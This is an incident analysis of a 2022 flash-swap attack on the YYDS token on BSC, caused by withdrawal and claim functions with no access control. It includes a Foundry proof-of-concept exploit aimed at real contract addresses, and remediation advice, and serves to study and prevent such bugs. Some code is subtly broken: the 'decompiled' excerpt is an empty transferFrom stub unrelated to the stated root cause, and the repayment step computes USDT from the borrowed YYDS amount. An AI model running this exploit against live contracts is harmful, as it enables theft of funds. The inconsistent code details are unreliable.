# YYDS — Flash Swap + Multiple Withdrawal Functions Reward Draining Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | YYDS Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **YYDS Token** | [0xB19463ad610ea472a886d77a8ca4b983E4fAf245](https://bscscan.com/address/0xB19463ad610ea472a886d77a8ca4b983E4fAf245) |
| **YYDS/USDT Pair** | [0xd5cA448b06F8eb5acC6921502e33912FA3D63b12](https://bscscan.com/address/0xd5cA448b06F8eb5acC6921502e33912FA3D63b12) |
| **Target Claim** | [0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9](https://bscscan.com/address/0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9) |
| **Target Withdraw** | [0x970A76aEa6a0D531096b566340C0de9B027dd39D](https://bscscan.com/address/0x970A76aEa6a0D531096b566340C0de9B027dd39D) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | No access control on `claim()` and multiple `withdrawReturnAmount*()` functions, enabling immediate mass withdrawal after a flash swap |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/Yyds_exp.sol) |

---
## 1. Vulnerability Overview

The YYDS protocol operated separate withdrawal functions for merchants, consumers, and referrals. The `TargetClaim.claim(address)` function and `TargetWithdraw`'s `withdrawReturnAmountByMerchant()`, `withdrawReturnAmountByConsumer()`, and `withdrawReturnAmountByReferral()` functions all lacked caller validation. The attacker flash-swapped a large amount of YYDS from the YYDS/USDT pair, then consecutively claimed rewards calculated based on that inflated balance from all three withdrawal functions, draining all of the protocol's YYDS.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable TargetClaim - claim() with no access control
contract TargetClaim {
    // ❌ Anyone can claim on behalf of an arbitrary address
    function claim(address user) external {
        uint256 userYYDSBalance = YYDS.balanceOf(user);
        // ❌ Reward calculated based on balance (manipulable via flash loan)
        uint256 reward = calculateReward(userYYDSBalance);
        YYDS.transfer(user, reward);
    }
}

// ❌ Vulnerable TargetWithdraw - all 3 withdrawal functions lack access control
contract TargetWithdraw {
    // ❌ Callable by anyone, calculated from balance at call time
    function withdrawReturnAmountByMerchant() external {
        uint256 amount = calculateMerchantReward(msg.sender);
        YYDS.transfer(msg.sender, amount);
    }

    function withdrawReturnAmountByConsumer() external {
        uint256 amount = calculateConsumerReward(msg.sender);
        YYDS.transfer(msg.sender, amount);
    }

    function withdrawReturnAmountByReferral() external {
        uint256 amount = calculateReferralReward(msg.sender);
        YYDS.transfer(msg.sender, amount);
    }
    // ❌ All 3 functions independently callable, enabling triple-claiming from the same balance
}

// ✅ Correct pattern - snapshot-based staking rewards
contract SafeTargetWithdraw {
    mapping(address => uint256) public stakedBalance;  // snapshot balance
    mapping(address => uint256) public lastWithdrawTime;

    function withdrawReturnAmountByMerchant() external {
        // ✅ Uses snapshot balance that cannot be manipulated by flash loans
        uint256 stakedAmt = stakedBalance[msg.sender];
        require(stakedAmt > 0, "No stake");
        require(block.timestamp > lastWithdrawTime[msg.sender] + 1 days, "Too early");

        uint256 amount = calculateMerchantReward(stakedAmt);
        lastWithdrawTime[msg.sender] = block.timestamp;
        YYDS.transfer(msg.sender, amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**Yyds_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: no access control on `claim()` and multiple `withdrawReturnAmount*()` functions, enabling immediate mass withdrawal after a flash swap
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash swap from YYDS/USDT pair
    │       pair.swap(largeYYDS, 0, attacker, data)
    │       enters pancakeCall() callback
    │
    ├─[2] Attacker's YYDS balance surges
    │       (balance spikes after flash borrow)
    │
    ├─[3] Call TargetClaim.claim(attacker)
    │       ❌ No access control
    │       Balance-based reward calculation → large YYDS payout
    │
    ├─[4] TargetWithdraw.withdrawReturnAmountByMerchant()
    │       ❌ No access control
    │       → Claim merchant reward
    │
    ├─[5] TargetWithdraw.withdrawReturnAmountByConsumer()
    │       ❌ No access control
    │       → Claim consumer reward
    │
    ├─[6] TargetWithdraw.withdrawReturnAmountByReferral()
    │       ❌ No access control
    │       → Claim referral reward
    │
    ├─[7] Repay flash swap
    │       (calculate profit, return USDT to pair)
    │
    └─[8] Drained YYDS → swap back to USDT for net profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ITargetClaim {
    function claim(address user) external;
}

interface ITargetWithdraw {
    function withdrawReturnAmountByMerchant() external;
    function withdrawReturnAmountByConsumer() external;
    function withdrawReturnAmountByReferral() external;
}

interface IUniPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract YYDSExploit is Test {
    ITargetClaim claim   = ITargetClaim(0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9);
    ITargetWithdraw wd   = ITargetWithdraw(0x970A76aEa6a0D531096b566340C0de9B027dd39D);
    IUniPair pair        = IUniPair(0xd5cA448b06F8eb5acC6921502e33912FA3D63b12);
    IERC20 YYDS          = IERC20(0xB19463ad610ea472a886d77a8ca4b983E4fAf245);
    IERC20 USDT          = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 21_157_025);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] YYDS balance", YYDS.balanceOf(address(this)), 18);

        // [Step 1] Flash swap from YYDS/USDT pair
        (uint112 r0, , ) = pair.getReserves();
        pair.swap(uint256(r0) * 90 / 100, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Holding large YYDS balance

        // [Step 3] claim() - claim reward based on balance
        // ⚡ No access control → attacker specifies themselves
        claim.claim(address(this));

        // [Steps 4–6] Call all 3 withdrawal functions sequentially
        // ⚡ All lack access control
        wd.withdrawReturnAmountByMerchant();
        wd.withdrawReturnAmountByConsumer();
        wd.withdrawReturnAmountByReferral();

        // [Step 7] Repay flash swap
        // Calculate required USDT via pair.getReserves() and return it
        uint256 repayUsdt = amount0 * 1003 / 1000 + 1;
        USDT.transfer(address(pair), repayUsdt);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Multiple withdrawal functions with no access control + flash swap balance manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Flash loan-based balance manipulation |
| **Attack Vector** | Flash swap → `claim()` + 3× `withdrawReturnAmount*()` |
| **Precondition** | Withdrawal functions calculate rewards based on current balance |
| **Impact** | Mass drainage of YYDS tokens |

---
## 6. Remediation Recommendations

1. **Use staking snapshots**: For reward calculation, use a separately recorded staking balance snapshot instead of the current balance (`balanceOf`).
2. **Single-claim principle**: When merchant/consumer/referral rewards are provided via separate functions, add mutually exclusive validation to prevent the same account from claiming rewards under multiple roles at the same point in time.
3. **Claim cooldown**: Enforce a minimum claim interval on each withdrawal function.

---
## 7. Lessons Learned

- **Risk of multi-role systems**: If a single address can simultaneously hold merchant, consumer, and referral roles and each role has an independent withdrawal function, an attacker can claim maximum rewards from all roles at once. Per-role withdrawals must be mutually exclusive.
- **Risk of current-balance-based rewards**: Using `balanceOf(msg.sender)` for reward calculation enables attacks where a flash loan temporarily inflates the balance to claim excessive rewards. Always use snapshot-based mechanisms.
- **Function separation widens the attack surface**: Splitting identical logic across multiple functions improves code modularity, but when each function is independently callable, the attack surface grows multiplicatively.